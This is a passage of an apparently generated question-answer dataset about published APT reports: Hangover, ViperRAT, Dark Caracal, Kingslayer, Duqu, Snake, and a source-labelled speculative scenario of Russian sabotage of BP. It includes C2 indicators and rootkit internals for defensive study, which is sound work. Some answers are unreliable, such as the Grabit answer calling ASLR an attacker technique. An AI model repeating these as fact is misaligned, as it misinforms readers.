    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Industrial espionage\nWhile the Telenor case was most likely industrial espionage, we were initially unaware of other \"non-strategic/political\" targets by this attack group, but during our research we discovered several related attack files that were clearly targeting businesses. As can be seen in the example below, the social engineering aspects are more related to business content. We want to emphasize that except in the case of BUMI PLC, we have no information to suggest that any of the organizations named in the following pages have been compromised. However, the available information strongly indicates that they were targets of interests for the attackers.\nMedium Headline: Known target: Bumi PLC, Indonesia\nWhen searching for known instances of domains belonging to the attack infrastructure, we found a published incident report made by Context Information Security (2). This report details how the Chairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012. Bumi is an international mining group listed on the London Stock Exchange.\nSource: Context Information Security.\nBoth the domains mentioned in this report have been connected to the attack group investigated. For example, the malware executable \"dua2alhycox12.exe\" (c94267ba9c92f241379cdceed58777dc) connects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for. The latter domain has also shared IP with the malicious domain chronicleserv.org.\nBig Headline: Possible target: Restaurant industry\nIt appears unlikely that the restaurant and food industry should be the victim of targeted attacks. However, that's how it appears. One indicator is the decoy file below, taken from the malicious executable \"Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe\" (f52154ae1366ae889d0783730040ea85).\nGuardian article about a horsemeat scandal in Ireland. Target is unknown, but file was first submitted to the VirusTotal scan service from Great Britain.\nAnother indicator is the use of certain domain names, like the malicious bluebird-restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk. The latter is a restaurant in Chelsea, UK.\nBig Headline: Likely target: Chicago Mercantile Exchange\nWhile investigating the malicious domain web-mail-services.info, we found a number of other domains that had shared the IP address 188.95.48.99 with it.  One of these domains was cmegroups.net, a spoof of cmegroup.com; the domain belonging to Chicago Mercantile Exchange. CME is the world's largest futures exchange company (3).\nAn entry on WIPO (4), the UN arbitration body for domain name disputes, shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012. The complaint was not disputed, and domain transferred to CME. However, the most interesting information is found in the case details.\nSource:wipo.net\nAn interesting question is of course whether there were any attachments to this mail.\nOther suggestive domain names that have been used include:\nserver721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de:\nThe latter is the mail server for several German businesses, for example restaurants. www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com:\nThe latter is a Lebanese newspaper in Arabic.\naccount.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de:\nThe latter is a German producer of pumps for high-viscosity fluids.\ndeltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com: Delta Airlines.\nmail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs mail.telenor.no: Telenor\nlynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm. mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs mail.carmel.us:  The latter is the webmail address of Carmel&Carmel, a US-based law firm. armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com: The latter is a US-based manufacturer of composite materials for armor:\nWe do not know (yet) what purpose all these domains have, but it's hard to imagine that the name spoofing is done by anything but malicious intent; it is a common tactic in targeted attacks.\nMedium Headline: Project and debug paths\nCuriously, many of the executables we uncovered from related cases contained cleartext project and debug path strings (see Appendix D for full list). It is not very common to find malware with debug paths, but these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were unaware of their presence. These paths gave more indicators that the attackers were Indian. First, many of the Visual Basic keyloggers contained the name \"Yash\", which might be an abbreviation for several Indian names. The trojans used against Telenor did not contain any such person name, but the Visual Basic project name is clearly related to others:\nTelenor case (02d6519b0330a34b72290845e7ed16ab, bfd2529e09932ac6ca18c3aaff55bd79) \"C:\\miNaPro.vbp\"\nRelated cases (4ad80ff251e92004f56bb1b531175a49, 3d6a8b2df08443c2aa4b6a07a9b55b16) \"D:\\YASH\\PRO\\MY\\DELIVERED\\2012\\DOWNLOADERS\\compiled\\NewSmack(sep2012)\\miNaPro.vbp\"\nThis similarity is not coincidental; these trojans are based on the same code and exhibit similar behaviour.\nThis and other text strings we initially saw gave further hints towards Indian attackers.\nR:\\payloads\\ita nagar\\Uploader\\HangOver 1.5.7 (Startup)\\HangOver 1.5.7 (Startup)\\Release\\Http_t.pdb C:\\Users\\neeru rana\\Desktop\\Klogger- 30 may\\Klogger- 30 may\\Release\\Klogger.pdb C:\\Users\\Yash\\Desktop\\New folder\\HangOver 1.5.7 (Startup) uploader\\Release\\Http_t.pdb\nBig Headline: A managed environment\nThe project paths also give a rare glimpse into something we almost never see \u2013 a managed malware creation environment, where multiple developers are tasked with specific malware deliverances.\nThis is visible in the way the projects themselves are organized:\n...Desktop\\Feb 2012\\kmail(httpform1.1) ...\n...May Payload\\new keylogger\\Flashdance1.0.2\\...\n...\\Monthly Task\\August 2011\\USB Prop\\...\n...\\Sept 2012\\Keylogger\\Release\\...\n...\\June mac paylods\\final Klogger-1 june-Fud from eset5.0\\Klogger- 30 may\\...\n...ner\\Task\\HangOver 1.2.2\\Release...\n...\\august\\13 aug\\HangOver 1.5.7 (Startup) uploader\\...\n...\\task information\\task of september\\Tourist 2.4.3...\n...\\final project backup\\complete task of ad downloader & usb grabber&uploader\\...\n..D:\\YASH\\PRO\\MY\\DELIVERED\\2012\\DOWNLOADERS\\compiled\\..\nThere are many diverging project paths which points towards different persons working on separate subprojects, but apparently not using a centralized source control system. The projects seem to be delegated into tasks, of which some seem to follow a monthly cycle. There are hints at team structures, like the string \"VB Team Matrix Production\" found in a sample (fa6d2483f766f8431b6c0a8c78178d48), an indication that a separate team works with Visual Basic development. Some series of malware contain strings like \"delivered\", which, together with the loose project structures may indicate that development work is being outsourced.\nBig Headline: The word \"Appin\".\nIn a great number of isolated cases and contexts, the word \"Appin\" shows up and there seems to be some connection with the Indian security company called Appin Security Group. By this, we are not implicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by falsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved, or maybe there are other explanations. Getting to the bottom of that is beyond our visibility.\nFor example, the strings \"Appin\", \"AppinSecurityGroup\", and \"Matrix\" are frequently found inside executables.\nOne example of this peculiarity is debug paths inside malware files:\nC:\\BNaga\\backup_28_09_2010\\threads tut\\pen-backup\\BB_FUD_23\\Copy of client\\ Copy of client\\appinbot_1.2_120308\\Build\\Win32\\Release\\appinclient.pdb\nC:\\BNaga\\kaam\\Appin SOFWARES\\RON 2.0.0\\Release\\Ron.pdb\nC:\\BNaga\\SCode\\BOT\\MATRIX_1.2.2.0\\appinbot_1.2_120308\\Build\\Win32\\Release\\deleter.pdb\nC:\\Documents and Settings\\Administrator\\Desktop\\Backup\\17_8_2011\\MATRIX_1.3.4\\CLIENT\\ Build\\Win32\\Release\\appinclient.pdb\nD:\\Projects\\Elance\\AppInSecurityGroup\\FtpBackup\\Release\\Backup.pdb\nOne should note that anyone can add or change such text strings.\n\nWhat indicators in the malware executables suggested that the attackers were Indian? How did these indicators provide insights into the attackers' nationality?",
    "output": "A: The indicators that suggested the attackers were Indian included the presence of the name 'Yash' in many of the Visual Basic keyloggers, which is a common abbreviation for several Indian names. Additionally, the project and debug path strings found in the executables contained references to Indian locations and names. For example, paths like 'D:\\\\YASH\\\\PRO\\\\MY\\\\DELIVERED\\\\2012\\\\DOWNLOADERS\\\\compiled\\\\NewSmack(sep2012)\\\\miNaPro.vbp' and 'C:\\\\Users\\\\neeru rana\\\\Desktop\\\\Klogger- 30 may\\\\Klogger- 30 may\\\\Release\\\\Klogger.pdb' indicated Indian involvement. These paths provided insights into the attackers' nationality by revealing names and locations that are specific to India.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: By Michael Flossman, Security Researcher\nViperRAT is an active, advanced persistent threat (APT) that sophisticated threat actors are actively using to target and spy on the Israeli Defense Force.\nThe threat actors behind the ViperRAT surveillanceware collect a significant amount of sensitive information off of the device, and seem most interested in exfiltrating images and audio content. The attackers are also hijacking the device camera to take pictures.\nUsing data collected from the Lookout global sensor network, the Lookout research team was able to gain unique visibility into the ViperRAT malware, including 11 new, unreported applications. We also discovered and analyzed live, misconfigured malicious command and control servers (C2), from which we were able to identify how the attacker gets new, infected apps to secretly install and the types of activities they are monitoring. In addition, we uncovered the IMEIs of the targeted individuals (IMEIs will not be shared publicly for the privacy and safety of the victims) as well as the types of exfiltrated content.\nIn aggregate, the type of information stolen could let an attacker know where a person is, with whom they are associated (including contacts' profile photos), the messages they are sending, the websites they visit and search history, screenshots that reveal data from other apps on the device, the conversations they have in the presence of the device, and a myriad of images including anything at which device's camera is pointed.\nLookout has determined ViperRAT is a very sophisticated threat that adds to the mounting evidence that targeted mobile attacks against governments and business is a real problem.\nLookout researchers have been tracking this threat for the last month. Given that this is an active threat, we've been working behind-the-scenes with our customers to ensure both personal and enterprise customers are protected from (<https://securelist.com/blog/incidents/77562/breaking-the-weakest-link-of-the-strongest-chain/>)this threat and only decided to come forward with this information after the research team at Kaspersky released a report earlier today.\nAdditionally, we have determined that though original reports of this story attribute this surveillanceware tool to Hamas, this may not be the case, as we demonstrate below.\n\nQuestion: What unique insights did the Lookout research team gain into the ViperRAT malware through their analysis of live, misconfigured command and control servers (C2)? How did these insights contribute to understanding the attacker's methods and targets?\n\nAnswer:",
    "output": "The Lookout research team gained unique insights into the ViperRAT malware by analyzing live, misconfigured malicious command and control servers (C2). Through this analysis, they discovered how the attackers distribute new, infected apps to secretly install on targeted devices and identified the types of activities being monitored. Additionally, they uncovered the IMEIs of the targeted individuals, providing a clearer picture of the victims' identities while maintaining their privacy and safety. These insights contributed to understanding the attacker's methods by revealing the specific types of exfiltrated content and the mechanisms used to compromise and monitor the devices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "This resonance may perhaps be seen in the Russian National Security Strategy to 2020 published in May of 2009. The document outlines a path for Russia to continue to regain prominent global power, and within it there are several points which lend credence to a strategic view of oil and gas resources. The document states that \"the longer-term focus of international politics will concentrate on the possession of energy resources, notably in the Middle East, on the Barents Sea shelf and other areas of the Arctic, in the Caspian Sea Basin, and in Central Asia.\"80 The same publication\n74  CIA Factbook 2012\n75  http://www.forbes.com/sites/kenrapoza/2012/04/03/oil-a-problem-for-russian-economy-official-says/\n76  http://www.ssb.no/a/publikasjoner/pdf/DP/dp617.pdf\n77  http://oilprice.com/Energy/Crude-Oil/Putin-Plays-Down-Russias-Deadly-Dependence-on-Oil-Gas-\nRevenues.html\nalso states that \"the competitive search for resources does not exclude the use of force.\" 81 Force in this case does not necessarily indicate a military kinetic action, but exertion of both soft and hard power across all domains, including cyber.\nWhat follows is a purely speculative narrative of one possible attack scenario, intended to highlight elements of Russian doctrine which align with aspects of the BP oil spill. It will also include techniques and tools which provide functionality that makes such an attack feasible.\nSo it is possible that after the oil price crash in 2008, Russian officials saw the danger to social and political stability in the country. Forecasts for Russian oil output around 2009 also suggested that not only were prices dropping, but overall production would as well, envisaging the specter of future unrest and hardship. Realizing the strategic importance of oil and the success they had garnered with previous market halts, they needed a way to either artificially inflate oil prices, increase demand for Russian oil, or increase oil output. It is worth noting that price of natural gas (another huge component of the Russian economy) is inextricably linked to oil prices in most of Europe during this period because gas is price-indexed against oil. Unlike the natural gas incidents where Russia was able to use state-controlled Gazprom to halt gas leaving the country, a sizeable portion of the oil leaving the country was from privatized companies. It would be difficult to overtly prevent them from exporting without significant backlash from international communities (such as the World Trade Organization where they had been seeking entry for some time), so action would need to be more covert. One of the largest of these private oil firms was TNK-BP, which Russian authorities had already attempted to strong-arm into government control as they had done with other smaller oil companies like Yukos. The other main exporter of oil to Western Europe at this time was BP plc, the 50% owner of TNK-BP. Therefore, control of TNK-BP would both increase oil revenues and state-output, and simultaneously decrease a prime competitor's overall output. It would also give them a larger political weapon that could be used as a bargaining chip or to meet the aforementioned goal of price control. However, BP had proven recalcitrant and defiant about relinquishing TNK-BP in spite of the pressures which had already been applied. A past rocky relationship with BP combined with their recent safety failures and cover-up in the Caspian Sea also made them a viable target.\nIf they could not be motivated by conventional means, then Russia would have to revert to force as pointed out earlier in their National Security Strategy to 2020 (\"the competitive search for resources does not exclude the use of force\"). Sabotage could be a viable option, however it would have to be on a large enough scale that BP would be put into a position where they would fold to Russian interests under the additional pressure. While an on-shore explosion would cause some delays in production and potential loss of life leading to litigation, off-shore destruction would have the potential to be significantly more damaging publicly, could also include loss of life, and would incur significant environmental fines in addition to safety fines.\nThe question would then be where to strike \u2013 BP holdings in the Caspian Sea would be too dangerous as any failures could easily implicate Russia and any success could cause collateral damage to Russian oil assets and coastal regions. The North Sea would be a potentially viable candidate with multiple countries being affected resulting in more economic impact on BP, however the currents are such that collateral damage could occur to other areas that Russia identified as vital fields of competition, namely the Barents Sea. BP's other major developments were in relatively new fields in the Gulf of Mexico (GoM) where BP planned to invest heavily. Russia has long seen (and continues to see) American power as a dangerous counter to its own, marking the US as its top global competitor. The GoM then would prove very attractive as it offered a two-fold bonus. A cash-strapped United States, riddled by its own recession, would bear the brunt of the collateral damage resulting in heavy fines to BP, perhaps made heavier because of the state of the American economy. Secondly, BP would possibly lose its asset(s) and right to drill offshore in the GoM, a region BP considered strategic. It would allow for an information influence operation on the American public \u2013 poisoning the market against BP, but also potentially against the American government if they repeated any mistakes in their handling of an incident like the 2005 Hurricane Katrina rescue and relief effort.\nAmerica in 2008 and 2009 was already facing internal contention over deep water drilling practices, meaning that a significant event in the region could perhaps halt production by governmental directive. Even with the contention, BP had already made history in the Gulf; in mid-2009 the Deepwater Horizon rig finished drilling the deepest oil well in history in the Tiber Oil Field off the coast of Texas. This meant that one of the top competitors for Russian oil exports was making headway in this region. America is also the largest importer of oil, so even though oil prices are a complicated affair that takes into account aspects like the economic stability of different regions and future projections of demand, any damaging effects on American production or supply could potentially increase oil prices.\nIn March of 2009, drilling of a new well, Macondo, was approved and scheduled to begin later that year, creating\n81  Ibid., p.87.\n78  http://www.reuters.com/article/2009/10/14/russia-oil-production-idUSLE70186320091014\n79  http://www.forbes.com/sites/markadomanis/2012/12/01/russia-and-oil-a-recipe-for-preservation-of-the-status-quo/\n80  Thomas, T. (2011). Recasting the Red Star. Fort Leavenworth: Foreign Military Studies Office. ,p.87.\nan ideal target. Realistically, in a clandestine project of such importance it is likely that Russia would have identified several GoM targets, perhaps alongside BP North Sea assets as well. Having the Gulf of Mexico in mind, Russia now needed a method for delivery. Analyzing the 2008 incident in the Caspian Sea which was still fresh at this time, it may have been noted that one of the root causes of the blowout was a flaw in the concrete\u2014concrete possibly provided by the same US contractor who worked for BP in the GoM: Halliburton. They may have also surmised that if the alarms and safety systems had not activated in the Caspian Sea incident, the crew may not have been capable of reacting quickly enough to prevent an explosion, thus creating a terrible ecological disaster and causing loss of life.\nSo, a workable option appeared to be a covert cyber-attack on rigs operating in the gulf which disabled safety measures or created a situation where a blowout would occur. If done correctly, they could easily hide any attribution behind China (who had been actively stealing secrets from oil companies at this time), a non-state hacking group, a sporadic virus, or merely a glitch/accident. Because of the high stakes involved in any attribution to Russia, the best option would be making it purely appear to be an accident or neglect by BP and its contractors. This could be achieved by playing on known patterns and behaviors by BP that were risky. The type of intelligence Russia would have been intimately familiar with through their own dealings with BP and analysis of other BP safety incident in the recent past. This blends seamlessly with the Russian concept of \"Reflexive Control.\"\n\nBased on the above text, answer a question. Why was the Gulf of Mexico considered a strategically advantageous target for a potential cyber-attack by Russia, compared to other locations such as the Caspian Sea or the North Sea? Discuss the geopolitical and economic factors involved.",
    "output": "The Gulf of Mexico was considered strategically advantageous for several reasons. First, it is distant from Russian assets, reducing the risk of collateral damage and direct attribution. Second, a significant event in the Gulf could halt production by governmental directive, given the existing contention over deep-water drilling practices in the U.S. Third, the U.S. is the largest importer of oil, so any disruption in American production could potentially increase oil prices. Additionally, targeting BP in the Gulf would affect a major competitor in a region where BP had made significant investments, potentially leading to heavy fines and loss of drilling rights. This would align with Russia's goal of increasing oil revenues and state output while decreasing competition.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nAs the modern threat landscape has evolved, so have the actors. The barrier to entry for cyber-warfare has continued to decrease, which means new nation states \u2014 previously without significant offensive capabilities1 \u2014 are now able to build and deploy widespread multi-platform cyber-espionage campaigns.\nThis report uncovers a prolific actor with nation-state level advanced persistent threat (APT) capabilities, who is exploiting targets globally across multiple platforms. The actor has been observed making use of desktop tooling, but has prioritized mobile devices as the primary attack vector. This is one of the first publicly documented mobile APT actors known to execute espionage on a global scale.\nLookout and Electronic Frontier Foundation (EFF) have discovered Dark Caracal2, a persistent and prolific actor, who at the time of writing is believed to be administered out of a building belonging to the Lebanese General Security Directorate in Beirut. At present, we have knowledge of hundreds of gigabytes of exfiltrated data, in 21+ countries, across thousands of victims. Stolen data includes enterprise intellectual property and personally identifiable information. We are releasing more than 90 indicators of compromise (IOC) associated with Dark Caracal including 11 different Android malware IOCs; 26 desktop malware IOCs across Windows, Mac, and Linux; and 60 domain/IP based IOCs.\nDark Caracal targets include individuals and entities that a nation state might typically attack, including governments, military targets, utilities, financial institutions, manufacturing companies, and defense contractors. We specifically uncovered data associated with military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions during this investigation. Types of data include documents, call records, audio recordings, secure messaging client content, contact information, text messages, photos, and account data.\nThe joint Lookout-EFF investigation began after EFF released its (<https://www.eff.org/files/2016/08/03/i-got-a-letter-from-the-government.pdf>)Operation Manul report, highlighting a multi-platform espionage campaign targeted at journalists, activists, lawyers, and dissidents who were critical of President Nursultan Nazarbayev's regime in Kazakhstan. The report describes malware and tactics targeting desktop machines, with references to a possible Android component. After investigating related infrastructure and connections to Operation Manul, the team concluded that the same infrastructure is likely shared by multiple actors and is being used in a new set of campaigns.\nThe diversity of seemingly unrelated campaigns that have been carried out from this infrastructure suggests it is being used simultaneously by multiple groups. Operation Manul clearly targeted persons of interest to Kazakhstan, while Dark Caracal has given no indication of an interest in these targets or their associates. This suggests that Dark Caracal either uses or manages the infrastructure found to be hosting a number of widespread, global cyber-espionage campaigns.\nSince 2007, Lookout has investigated and tracked mobile security events across hundreds of millions of devices around the world. This mobile espionage campaign is one of the most prolific we have seen to date. Additionally, we have reason to believe the activity Lookout and EFF have directly observed represents only a small fraction of the cyber-espionage that has been conducted using this infrastructure.\n1 (<https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf>)https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf\n2 In keeping with traditional APT naming, we chose the name \"Caracal\" (pronounced [kar-uh-kal]) because the feline is native to Lebanon and because this group has remained hidden for so long. From the (<https://en.wikipedia.org/wiki/Caracal>)Wikipedia entry \"the caracal is highly secretive and difficult to observe\" and \"is often confused with [other breeds of cat].\" The naming further builds on EFF's \"Operation Manul,\" another feline reference. We like cats.\n\nAnswer this question based on the above context: Why did Dark Caracal prioritize mobile devices as the primary attack vector over desktop tooling? What strategic advantages does this approach provide in a global cyber-espionage campaign?",
    "output": "Dark Caracal prioritized mobile devices as the primary attack vector because mobile devices are ubiquitous and often contain a wealth of personal and professional information. This approach provides several strategic advantages. First, mobile devices are frequently used for both personal and work purposes, making them a rich source of diverse data. Second, users tend to have their mobile devices with them at all times, allowing for continuous surveillance. Lastly, mobile security measures are often less robust compared to desktop systems, making them easier targets for sophisticated APT actors like Dark Caracal.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SOFTWARE VENDORS, AND SYSADMINS ON NOTICE\nSubversion of an application preferentially used by enterprise system or security administrators provides an advanced threat group a nearly unprecedented \"best bang for the buck.\" There is no need to craft phishing emails, or sort the chaff from successful but unfruitful malware infections. It would not be hard to posit that Kingslayer might serve as a template for other attacks on otherwise hardened enterprise networks. This should put the developers of applications and software aimed for exclusive use by enterprise network administrators on notice. Although the following are good tenants of all software vendors, they are especially important when the application in question would disproportion-ality be used by administrators of a network. These include:\n\u2022 File integrity monitoring\n\u2022 Secure (dedicated or virtually private) hosting\n\u2022 Validated time stamping of digital signatures\n\u2022 Secure storage of and deployment of code-signing keys, ideally employing a High Security Module (HSM)\n\u2022 Comprehensive network and endpoint visibility of development environment\n\u2022 Breach disclosure policy that ensures timely incident notification to affected customers\nEnterprise network administrators should take heed that they are perhaps the most important and pivotal target for advanced threats interested in what might be found on those enterprise networks10 . Network admins should not exempt their own systems, or systems to which only they have access, from network and endpoint visibility. Sysadmins should also contribute to and follow a change control policy that evaluates the software vendor and the software itself for potential risk, prior to installing it11 .\nMedium Headline: HOW WAS THE KINGSLAYER INVESTIGATION INFORMED?\nThe analysis that informed the Kingslayer campaign investigation is described in general terms as iterative, using \"many and any friendly means\" employed by a multi-disciplinary team. While characterizing the purpose, impact and extent of the malicious activity perpetrated by the Kingslayer campaign operators, RSA Research provided dozens of hours of advanced incident and analysis support to infected organizations identified by sinkholing and passive means. Sometimes our support was in exchange for threat intelligence artifacts left behind by the actors. At other times we provided advice and expertise with the understanding that the infected organization would not or could not provide any information in return. We collaborated with many colleagues in the security industry, reached out to new partners as well as called upon the extensive capabilities of SecureWorks, a Dell Technologies company.\nMedium Headline: DETECTION OF KINGSLAYER, AND THE NEXT SOFTWARE SUPPLY CHAIN ATTACK\nTechniques deployed by industry-wide antivirus and endpoint prevention technologies are decidedly poorly equipped for detecting, much less preventing, a remote code-loading backdoor inserted into what would otherwise be a legitimate software product. This is exactly what the Kingslayer actors did in their campaign.\nIn our experience, signature or behavior-based antivirus is unable to differentiate between a network-enabled feature and a backdoor in the product. In fact, RSA Research first identified the Kingslayer backdoor installed on an enterprise system that employed next generation antivirus. The antivirus failed to detect anything, even when it appeared the backdoor had downloaded and loaded the secondary malware into memory, and opened connections for C2.\n10\n11\nSmall Headline: RSA NETWITNESS\u00ae ENDPOINT EDR TOOL\nCompare this antivirus failure with RSA NetWitness\u00ae Endpoint, an Enterprise Detection and Response (EDR) tool that is available to RSA customers and is notably used by the RSA IR Team in their customer engagements. On a lab Windows system, RSA Research recreated the Kingslayer backdoor installation, then deployed RSA NetWitness Endpoint. In Figure 5, we see that RSA NetWitness Endpoint identified an instance of [FLOATING_CODE], revealing that the backdoored \"Service.exe\" process established multiple connections. [FLOATING_CODE] identifies a block of code present in a process private executable address space, as opposed to a library properly loaded from disk. Floating code is missing a normal DLL header. In otherwise, legitimate software with a backdoor such as that employed by Kingslayer, the network connections were established from that allocated block of code, which is suspicious.\nIn Figure 6, a threat hunter behind the RSA NetWitness Endpoint console dug into the network details tab, to reveal the multiple connections to a suspicious domain.\nSmall Headline: RSA NETWITNESS PACKETS AND LOGS\nWhile RSA NetWitness Endpoint will flag the floating code of Kingslayer, a method to detect the network traffic of a backdoor compromise like Kingslayer with network packet visibility is also important. Consider that the RSA IR team found a Kingslayer-compromised organization \"enjoyed\" multiple weeks of static compromise before the actor(s) arrived on scene to begin interactive lateral exploitation. Early detection of compromise, then, can be key to dramatically reducing business risk.\nThe Event Stream Analysis (ESA) capability in RSA NetWitness technology was designed by researchers in the RSA Data Sciences team after analyzing billions of packets of known C2 activity. ESA is the statistical threat hunting machine that never goes to sleep, using machine learning to calculate scores on a very large number of HTTP sessions and domains. Indeed, even the unusual beaconing patterns of the Kingslayer Trojan were flagged by the ESA as Suspected C&C (Figure7).\nEven without the interactive C2 of an \"operator behind the keyboard\" that might trigger other alerts, consider how a Security Operations Center will be alerted to suspicious activity, and stop the compromise before an actor starts controlling assets inside the network. For more details on how to hunt using RSA NetWitness capabilities such as ESA, refer to the RSA NetWitness hunting guide12.\n12\nMedium Headline: HOW TO INVESTIGATE IF YOU MIGHT HAVE BEEN COMPROMISED BY KINGSLAYER\nAn enterprise network finding that the subverted application was installed prior to and/or updated during the compromise window of 09-25 April 2015, should initiate an investigation. While prevention of compromise through King-slayer might not have been possible without the most stringent change control policy and thorough software analysis and auditing, an investigation of what may have been done by Kingslayer actors should be initiated. It is possible that the actors have established and still maintain avenues of access, especially on high-value target networks.\nHow can you tell if a system has had this subverted software installed?  The Yara signature included in the Kingslayer report annex, combined with a Yara-capable EDR tool, such as RSA NetWitness Endpoint, will facilitate a rapid enterprise survey for Kingslayer artifacts. RSA Research's Yara signature will detect artifacts from the stolen code-signing key used to sign DLLs and EXEs in the Kingslayer backdoor. While this code-signing key was also used to sign some limited number of legitimate software versions, any hits with this signature warrants investigation. Systems and Windows networks found with any of the Indicators of Compromise (IOCs) in the Kingslayer IOC list, should be analyzed for compromise. Enterprise investigation should focus on identifying any ongoing C2 channels and activity, and an assessment of business risk/loss should a breach be indicated.\nMedium Headline: CONCLUSION\nRSA Research observed sustained activity from an advanced threat actor group over 18+ months, tied to campaigns attributed to Codoso. There was an evolutionary deployment of tools characterized by very low (if any) coverage by antivirus vendors. In the course of our research and disruption of this malicious activity, RSA was able to uncover an advanced strategic targeting campaign involving a software supply chain attack aimed at sysadmins of large enterprises, dubbed Kingslayer. While the entire target set of Kingslayer is unknown, RSA Research expects the information contained in this report to be useful for network defenders in determining if they have been Kingslayer subjects of compromise. This may not be the last software supply chain attack from these or related actors. We believe Kingslayer, with its inherent enterprise breach efficacy and long interlude before discovery, could serve as a template for future strategic network compromises. We illustrated that it takes keen visibility and awareness, and the right tools, to discover advanced threat activity like Kingslayer. Finally, organizations need to have the ability to detect and respond to the next supply chain attack, before it has an impact on their business or mission.\n\nAnswer this question based on the above context: Why is the Kingslayer attack considered particularly effective against enterprise networks, and what measures can software vendors take to mitigate such risks?",
    "output": "The Kingslayer attack is considered particularly effective because it targets software used by enterprise system or security administrators, providing the attackers with a 'best bang for the buck.' This approach eliminates the need for crafting phishing emails or dealing with unfruitful malware infections. Software vendors can mitigate these risks by implementing several measures, including file integrity monitoring, secure hosting, validated time stamping of digital signatures, secure storage and deployment of code-signing keys (ideally using a High Security Module), comprehensive network and endpoint visibility of the development environment, and a breach disclosure policy that ensures timely incident notification to affected customers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Grabit APT's use of code obfuscation, encryption, and anti-analysis techniques relate to Defense Evasion?",
    "output": "Defense Evasion refers to the techniques used by adversaries to avoid detection throughout their compromise. In the case of the Grabit APT, the attackers employed various Defense Evasion techniques to evade detection. For instance, they used code obfuscation and encryption to make it difficult for analysts to understand the malware's behavior. Additionally, they implemented anti-analysis techniques such as Address Space Layout Randomization (ASLR) to hinder reverse engineering efforts. However, despite these efforts, the attackers did not adequately cover their tracks, leaving behind clear-text communication and failing to delete binaries in most cases. This suggests that while the attackers attempted to use Defense Evasion techniques, their implementation was incomplete or inconsistent, ultimately making it easier for researchers to analyze and detect their malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key indicators of a Duqu infection, and how can administrators monitor for these indicators within their network?",
    "output": "The Duqu trojan attempts to use the network to communicate with a remote command and control (C2) server to receive instructions and to exfiltrate data. Analysis of Duqu revealed that it uses the 206.183.111.97 IP address as its C2 server. This IP address is located in India and has been shut down by the hosting provider. Also, Duqu may attempt to resolve the kasperskychk.dyndns.org domain name. The resulting IP address is not used for communications, so this lookup may serve as a simple Internet connectivity check. Administrators should monitor their network for systems attempting to resolve this domain or connect to the C2 IP address for possible infection. Duqu uses multiple protocols to communicate with its C2 server, including standard HTTP on TCP port 80 and a custom protocol on TCP port 443. Some of Duqu's communications that use TCP port 443 do not use the HTTPS protocol. Organizations may be able to monitor egress traffic through proxy servers or web gateways and investigate network traffic that does not conform to the SSL (Secure Sockets Layer) specification. Non-SSL traffic on port 443 is commonly observed with other threats, and this behavior is not exclusive to Duqu. The name 'Duqu' was assigned to this malware because the keylogger program creates temporary files that begin with the prefix '~DQ'. A computer infected with Duqu may have files beginning with '~DQ' in Windows temporary directories.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: VIRTUAL FILE VOLUMES\nThe driver creates virtual file volumes for encrypted storage of its files and configuration data:\n\u2022 \\\\.\\Hd1\n\u2022 \\\\.\\Hd2\nThe volumes are mounted from the virtual file systems RawDisk1 and RawDisk2.\nThe first partition is created with the following steps:\n\u2022 the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling IoCreateFile() API\n\u2022 then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\u2022 next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\u2022 finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is written to or read from the volume. The encryption algorithm is based on CAST-128, with the hard-coded key stored in the rootkit body.\nAs a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage file hotfix.dat, which is physically located within the rootkit's 'home' directory:\nZ:\\WINDOWS\\$NtuninstallQ817473$>dir\nVolume in drive Z has no label.\nVolume Serial Number is 2479-98AC\nDirectory of Z:\\WINDOWS\\$NtuninstallQ817473$\nAnalysis of the hotfix.dat file contents reveals it's a fully encrypted file with flat entropy. Thus, it is not possible to reveal the contents of the Snake's volume by accessing the contents of this file (unless the encryption is broken, that is).\nEnlisting the contents of the created volume is possible, along with creating files on it:\nC:\\>echo Test > \\\\.\\Hd1\\Test.txt\nC:\\>type \\\\.\\Hd1\\\\Test.txt\nTest\nC:\\>dir \\\\.\\Hd1\\\\\nVolume in drive \\\\.\\Hd1 has no label.\nVolume Serial Number is BA9B-99E8\nDirectory of 